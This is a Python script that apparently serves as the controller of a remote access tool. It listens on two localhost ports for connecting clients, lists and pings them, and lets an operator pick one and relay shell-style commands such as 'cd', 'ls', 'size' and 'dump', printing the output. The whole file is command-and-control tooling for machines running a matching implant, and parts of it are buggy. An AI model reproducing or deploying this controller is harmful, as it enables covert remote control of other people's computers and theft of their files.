#!/usr/bin/env python3

import socket
import threading
import time

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
LISTEN_PORT = 1337         # Port to listen on (non-privileged ports are > 1023)
OUT_PORT = 6969            # Port to send commands to
BUFFER_LEN = 1024

CONN = None
ADDR = None
PATH = None

class mySocket:
    all_sockets = []
    def __init__(self, conn, addr):
        print("Connected by", addr)
        self.conn = conn
        self.addr = addr
        mySocket.all_sockets.append(self)
    
    def send(self, message):
        global PATH
        self.conn.send(message.encode())
        if message.startswith("cd "):
            recieved = self.conn.recv(BUFFER_LEN)
            if len(recieved) > 0:
                PATH = recieved.decode()
        elif message.startswith("size "):
            try:
                recieved = int(self.conn.recv(BUFFER_LEN))
            except:
                recieved = 0
            print(recieved)
        elif message.startswith("dump "):
            pass

    def connect(self):
        if self.ping():
            return self, self.addr
        return None, None
    
    def ping(self):
        try:
            self.conn.send("ping".encode())
            recieved = self.conn.recv(BUFFER_LEN)
            if recieved.decode() == "pong":
                return True
        except Exception as e:
            print(f"{':'.join(map(str, self.addr))} {e}")
            mySocket.all_sockets.remove(self)
            return False


def init_socket_out_listen():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, OUT_PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            mySocket(conn, addr)

def init_socket_in_listen():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, LISTEN_PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            x = threading.Thread(target=socket_listen, args=(conn, addr))
            x.start()
            
def socket_listen(conn, addr):
    while True:
        recieved = conn.recv(BUFFER_LEN)
        if len(recieved) != 0:
            if recieved == "pong":
                pass
            else:
                print(recieved.decode(), end="")
        else:
            time.sleep(1)
            
x = threading.Thread(target=init_socket_out_listen, args=())
x.start()
y = threading.Thread(target=init_socket_in_listen, args=())
y.start()

while True:
    if CONN is None:
        cmd = input(">\t")
    else:
        cmd = input(f"{':'.join(map(str, ADDR))} {PATH}>\t")

    if cmd == "ls":
        if CONN is None:
            for sock in mySocket.all_sockets:
                # Clean up list
                if sock.ping():
                    print(f"\t{':'.join(map(str, sock.addr))}")
        else:
            try:
                CONN.send(cmd)
            except WindowsError:
                CONN = None
                ADDR = None
                PATH = "~"
    elif cmd.startswith("conn"):
        args = cmd.split()
        for i in mySocket.all_sockets:
            if ':'.join(map(str, i.addr)) == args[1]:
                CONN, ADDR = i.connect()
                PATH = "~"
    elif CONN is not None:
        try:
            CONN.send(cmd)
        except WindowsError:
            CONN = None
            ADDR = None
            PATH = "~"

    time.sleep(1)